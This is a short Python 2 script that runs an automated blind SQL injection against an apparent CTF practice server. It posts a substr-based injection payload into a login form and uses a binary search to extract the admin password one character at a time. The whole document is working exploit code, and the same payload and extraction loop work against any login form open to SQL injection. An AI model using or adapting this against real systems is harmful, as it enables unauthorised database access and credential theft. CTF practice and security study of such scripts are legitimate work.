# coding: utf-8

"""
    Automated blind SQLi automated
    References:
        DiabloHorn https://diablohorn.wordpress.com
        http://blog.shift-crops.net/?p=325
        http://ikechampion.hatenablog.com/entry/2014/03/04/143253

"""""

import urllib

BASE_URL = "http://ctfq.sweetduet.info:10080/~q6/"
BASE_QUERY = "' or substr((select pass from user where id='admin'),{},1) {} '{}' --"
SUCCESS_TEXT = "Congratulations!"
POST_DATA = "id=admin&pass={}"

def post_query_result(data):
    global POST_DATA

    query = POST_DATA.format(data)
    pagecontent = urllib.urlopen(BASE_URL, query)
    body = pagecontent.read()

    if SUCCESS_TEXT in body:
        return True
    else:
        return False


def binsearch(cnt):
    # search ascii num 48 ~ 122 (0 1 2 ... A B ... a b ... z)
    searchlow = ord("0")  # 48 
    searchhigh = ord("z")  # 122
    searchmid = 0

    while True:
        searchmid = (searchlow + searchhigh) / 2
        if post_query_result(BASE_QUERY.format(cnt, "=", chr(searchmid))):
            break
        elif post_query_result(BASE_QUERY.format(cnt, ">", chr(searchmid))):
            searchlow = searchmid + 1
        elif post_query_result(BASE_QUERY.format(cnt, "<", chr(searchmid))):
            searchhigh = searchmid
    return chr(searchmid)

def execquery():
    flag = ""
    cnt = 1

    # until "' or substr((select pass from user where id='admin'),cnt,1) = '' -- '" is true
    while not post_query_result(BASE_QUERY.format(cnt, "=", "")):
        flag += binsearch(cnt)
        cnt += 1
        print flag

    return flag

if __name__ == "__main__":
    flg = execquery()
    print "flag is", flg 
